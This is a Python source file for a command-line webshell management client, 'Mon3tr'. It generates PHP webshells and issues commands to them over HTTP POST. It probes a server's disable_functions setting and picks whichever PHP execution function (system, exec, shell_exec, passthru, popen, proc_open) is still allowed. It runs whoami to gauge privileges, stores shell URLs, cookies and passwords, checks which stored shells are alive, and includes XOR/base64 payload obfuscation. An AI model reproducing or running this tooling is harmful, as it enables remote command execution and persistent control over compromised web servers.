"""  
@Time: 2024/3/6 9:58 
@Auth: Y5neKO
@File: console.py 
@IDE: PyCharm 
"""
import argparse
import os
from urllib.parse import parse_qs

import chardet
import requests

from core.color import *
from core.general import *

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
}


# def request(url, payload):
#     headers = {"Content-Type": "application/json;charset=gbk"}
#     cookies = {"user_token": payload}
#     response = requests.get(url=url, headers=headers, cookies=cookies)
#     response.encoding = "gbk"
#     return response.text


def parse_cookies_from_str(cookie_str):
    """将 cookie 字符串解析为字典"""
    cookies = {}
    for item in cookie_str.split(';'):
        key, value = item.strip().split('=', 1)
        cookies[key] = value
    return cookies


def xor_decode(string, key):
    str_length = len(string)
    key_length = len(key)
    tmp = 0
    result = ""

    for i in range(0, str_length):
        result += chr(ord(string[i]) ^ ord(key[tmp]))

        if tmp + 1 < key_length:
            tmp += 1
        else:
            tmp = 0

    return result


def payload_generate(cmd, key):
    payload = xor_decode("system('" + cmd + "');", key)
    payload = base64.b64encode(payload.encode("utf-8"))
    payload = payload.hex()
    print(payload)
    return payload


def payload_php_cmd_generate(cmd, disable_functions):
    if "system" not in disable_functions:
        payload = "system('" + cmd + "');"
    elif "exec" not in disable_functions:
        payload = f"""
                exec('{cmd}', $output);
                foreach ($output as $line) {{
                    echo $line . "\\n";
                }}
                """
    elif "shell_exec" not in disable_functions:
        payload = f"""
                $output = shell_exec('{cmd}');
                echo $output;
                """
    elif "passthru" not in disable_functions:
        payload = f"""
                passthru('{cmd}');
                """
    elif "popen" not in disable_functions:
        payload = f"""
                $output = popen('{cmd}', 'r');
                while (!feof($output)) {{
                    echo fgets($output);
                }}
                """
    elif "proc_open" not in disable_functions:
        payload = f"""
                $descriptorspec = array(
                    0 => array("pipe", "r"),
                    1 => array("pipe", "w"),
                    2 => array("pipe", "w")
                );
                $process = proc_open('{cmd}', $descriptorspec, $pipes);
                echo stream_get_contents($pipes[1]);
                echo stream_get_contents($pipes[2]);
                """
    else:
        return "echo '所有命令执行方式均禁用,需要bypass_disable_functions';"
    return payload


def main():
    parse = argparse.ArgumentParser(description="Mon3tr Webshell Management Client",
                                    formatter_class=argparse.RawTextHelpFormatter)

    parse.add_argument("-g", "--generate_webshell", action="store", type=str,
                       help="生成webshell的文件名")
    parse.add_argument("-w", "--webshell", action="store", type=str, help="webshell路径")
    parse.add_argument("--cookie", action="store", type=str, help="Cookie值(格式: User=123;Pass=456)")
    parse.add_argument("-p", "--password", action="store", type=str, help="Webshell密码")
    parse.add_argument("-s", "--save", action="store", type=str, help="保存Webshell配置")
    parse.add_argument("-x", "--xor", action="store", type=str, help="xor加密key")
    parse.add_argument("-c", "--cmd", action="store", type=str, help="执行命令")
    parse.add_argument("--list-config", action="store_true", help="列出Webshell配置")

    # 接收命令行参数解析后的参数
    args = parse.parse_args()

    if args.generate_webshell is not None:
        print("------------------------------开始任务------------------------------")
        webshell_dir = args.generate_webshell
        webshell_data = gen_php_webshell()
        with open(webshell_dir, 'w') as f:
            f.write(webshell_data[0])
        print("生成成功, 路径为: " + os.path.abspath(webshell_dir))
        print(webshell_data[1])
        print("------------------------------任务结束------------------------------")
        return 1

    if args.webshell is not None and args.webshell.startswith("http"):
        print("------------------------------开始任务------------------------------")
        print("[" + color("INFO", "blue") + "]")
        if args.cookie is not None and args.password is not None:
            cookies = parse_cookies_from_str(args.cookie) if args.cookie else {print("Cookie格式错误")}
            print("Webshell地址：" + args.webshell)
            print("Cookie: " + str(cookies))
            print("Passowrd: " + args.password)
            if args.cmd is not None:
                print("Payload: " + args.cmd)
            if args.save is not None:
                config = {
                    "Webshell": args.webshell,
                    "Cookie": cookies,
                    "Password": args.password
                }
                update_flag = 0
                if os.path.exists("./webshells/" + args.save + ".json"):
                    update_flag = 1
                with open("./webshells/" + args.save + ".json", "w") as json_file:
                    json.dump(config, json_file, indent=4)
                if update_flag == 1:
                    print("配置更新成功")
                else:
                    print("配置保存成功")
            print("------------------------------环境分析------------------------------")
            try:
                data_disable_functions = args.password + "=$disabledFunctions=ini_get('disable_functions');echo $disabledFunctions;"
                response_disable_functions = requests.post(args.webshell, headers=headers, cookies=cookies, data=parse_qs(data_disable_functions))
                values = [value.strip() for value in response_disable_functions.text.split(",")]
                disable_functions_value = str(values)
                if values[0] == "":
                    disable_functions_value = "不存在disbale_functions"
            except Exception as e:
                values = []
                disable_functions_value = "不存在disbale_functions"
            data_whoami = args.password + "=" + payload_php_cmd_generate("whoami", values)
            response_whoami = requests.post(args.webshell, headers=headers, cookies=cookies, data=parse_qs(data_whoami))
            print("veliged:" + response_whoami.text, end="")
            print("disale_functios:" + disable_functions_value)

            if args.cmd is not None:
                print("------------------------------命令回显------------------------------")
                post_data = args.password + "=" + payload_php_cmd_generate(args.cmd, values)
                response = requests.post(args.webshell, headers=headers, cookies=cookies, data=parse_qs(post_data))
                encoding = chardet.detect(response.content)['encoding']
                if encoding is not None:
                    result = response.content.decode(encoding, errors='ignore')
                else:
                    result = response.text
                print(color("Mon3tr@localhost:", "green") + "~" + color("$ ", "cyan") + f"{args.cmd}\n" + result)
            print("------------------------------任务结束------------------------------")
            return 1
    elif args.webshell is not None and not (args.webshell.startswith("http")):
        print("------------------------------开始任务------------------------------")
        print("[" + color("INFO", "blue") + "]")
        with open("./webshells/" + args.webshell + ".json", "r") as json_file:
            config_data = json.load(json_file)
        print("Webshell地址：" + config_data["Webshell"])
        print("Cookie: " + str(config_data["Cookie"]))
        print("Passowrd: " + config_data["Password"])
        if args.cmd is not None:
            print("Payload: " + args.cmd)
        print("------------------------------环境分析------------------------------")
        try:
            data_disable_functions = config_data["Password"] + "=$disabledFunctions=ini_get('disable_functions');echo $disabledFunctions;"
            response_disable_functions = requests.post(config_data["Webshell"], headers=headers, cookies=config_data["Cookie"],
                                             data=parse_qs(data_disable_functions))
            values = [value.strip() for value in response_disable_functions.text.split(",")]
            disable_functions_value = str(values)
            if values[0] == "":
                disable_functions_value = "不存在disbale_functions"
        except Exception as e:
            values = [None]
            disable_functions_value = "不存在disbale_functions"
        data_whoami = config_data["Password"] + "=" + payload_php_cmd_generate("whoami", values)
        response_whoami = requests.post(config_data["Webshell"], headers=headers, cookies=config_data["Cookie"], data=parse_qs(data_whoami))
        print("veliged:" + response_whoami.text, end="")
        print("disale_functios:" + disable_functions_value)

        if args.cmd is not None:
            print("------------------------------命令回显------------------------------")
            post_data = config_data["Password"] + "=" + payload_php_cmd_generate(args.cmd, values)
            response = requests.post(config_data["Webshell"], headers=headers, cookies=config_data["Cookie"], data=parse_qs(post_data))
            encoding = chardet.detect(response.content)['encoding']
            if encoding is not None:
                result = response.content.decode(encoding, errors='ignore')
            else:
                result = response.text
            print(color("Mon3tr@localhost:", "green") + "~" + color("$ ", "cyan") + f"{args.cmd}\n" + result)
        print("------------------------------任务结束------------------------------")
        return 1

    if args.list_config:
        print("------------------------------配置列表------------------------------")
        filenames = []
        directory = './webshells/'
        for filename in os.listdir(directory):
            alive = generate_random_string(20)
            if os.path.isfile(os.path.join(directory, filename)):
                base_name = os.path.splitext(filename)[0]
                filenames.append(base_name)
                with open("./webshells/" + base_name + ".json", "r") as json_file:
                    config_data = json.load(json_file)
                post_data = config_data["Password"] + f"=echo {alive};"
                response = requests.post(config_data["Webshell"], headers=headers, cookies=config_data["Cookie"],
                                         data=parse_qs(post_data))
                encoding = chardet.detect(response.content)['encoding']
                if encoding is not None:
                    result = response.content.decode(encoding, errors='ignore')
                else:
                    result = response.text
                if alive in result:
                    print("[" + color("+", "green") + f"]{base_name}")
                else:
                    print("[" + color("-", "red") + f"]{base_name}")
        print("------------------------------任务结束------------------------------")
        return 1

